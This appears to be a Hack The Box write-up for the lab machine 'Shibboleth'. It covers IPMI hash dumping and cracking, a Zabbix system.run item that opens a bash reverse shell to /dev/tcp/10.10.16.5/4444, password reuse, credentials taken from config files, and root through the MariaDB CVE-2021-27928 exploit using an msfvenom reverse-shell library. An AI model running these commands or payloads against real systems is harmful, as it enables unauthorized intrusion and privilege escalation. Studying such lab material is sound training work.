## Enumeration

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```

```bash
echo "10.10.11.124 shibboleth.htb" | sudo tee -a /etc/hosts
```

## HTTP

Right at the bottom of the application we find "Powered by enterprise monitoring solutions based on Zabbix & Bare Metal BMC automation". After a google search we deduce that Zabbix and BMC (monitoring solutions) could be running on an UDP endpoint.

Let's start fuzzing

```bash
gobuster -q dir -u http://shibboleth.htb -w /SecLists/Discovery/Web-Content/big.txt -t 200       
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
/server-status        (Status: 403) [Size: 279]     
```

Nothing of interest, let's move on to vhost fuzzing

```bash
ffuf -u 'http://shibboleth.htb/' -H "Host: FUZZ.shibboleth.htb" -w 
/SecLists/Discovery/Web-Content/big.txt -mc 200

monitor 
monitoring 
zabbix
[Status: 200, Size: 3686, Words: 192, Lines: 30] 
[Status: 200, Size: 3686, Words: 192, Lines: 30] 
[Status: 200, Size: 3686, Words: 192, Lines: 30]
```
All vhost end up in the same zabbix login page. 

Now we can enumerate the UDP endpoint

```bash
sudo nmap -F -sUV shibboleth.htb

PORT    STATE SERVICE  VERSION
623/udp open  asf-rmcp
```

The remote host is running an Alert Standard Format (ASF) aware device that can be 
controlled remotely using Remote Management and Control Protocol (RMCP) on port 623/udp.

Based of the following article:
[A Penetration Tester's Guide to IPMI and BMCs | Rapid7 Blog](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)

We'll use Metasploit for discovering the IPMI version.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So we have IPMIv2.0 and it supports multiple user auth. In the same article we read that v2.0 is vulnerable to cipher 0 bypass, and there's a module to verify the vulnerability in metasploit.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Moving on we'll use `impi_dumphashes` from metasploit.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:f7a4e4468202000036eb579e59edd3307774a8af69ab3db619b07694fb92dcad75d0dd03899f6a4aa123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1f5f87aaf9c940551ed4ffea4d0fcc9ced1f5822
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Crack it with hashcat

```bash
hashcat -m 7300 hash rockyou.txt
```

The password is "ilovepumkinpie1".

## Exploitation
Login to the Zabbix app with the obtained admin creds. We can execute remote commands via Item Keys ([here](https://sbcode.net/zabbix/agent-execute-python/)). Navigate to Configurations -> Hosts -> Items. Up on the right corner click on "create item", once there under key input field you can execute a remote OS command with ‘system.run’ like this:

```
system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.5/4444 0>&1",nowait]
```

If it fails to connect, search the item via the name field, find and run the "execute now" button.

We obtain a shell on the filesystem as user `zabbix`:

```bash
zabbix@shibboleth:/$ id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
```

Enumerate the rest of the users:

```bash
zabbix@shibboleth:/$ grep 'bash' /etc/passwd 
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
```

The above user `ipmi-svc` is re-using the same password, so we can make a lateral move:

```bash
zabbix@shibboleth:/$ su ipmi-svc 
Password:
ipmi-svc@shibboleth:/$ id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

Enumerating the filesystem we come across a database password (the user name and database can be found on the same file).

```bash
ipmi-svc@shibboleth:/$ grep -iR 'password' /etc/zabbix/ 2>/dev/null 
[..] 
/etc/zabbix/zabbix_server.conf: DBPassword=bloooarskybluh
```

We can verify that mysql is running on the localhost and connect to it using the above creds:

```bash
ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix
[..]
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
[..]
```

Based on the version of the database we can gain root access via a RCE vulnerability ([CVE-2021-27928](https://www.cvedetails.com/cve/CVE-2021-27928/))

Following the [this PoC](https://github.com/Al1ex/CVE-2021-27928) we can execute to get a privileged shell:

```bash
MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
```

where `exploit.so` is an `elf-so` payload we tranfered on the target's `tmp` directory:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=9002 -f elf-so -o 
exploit.so
```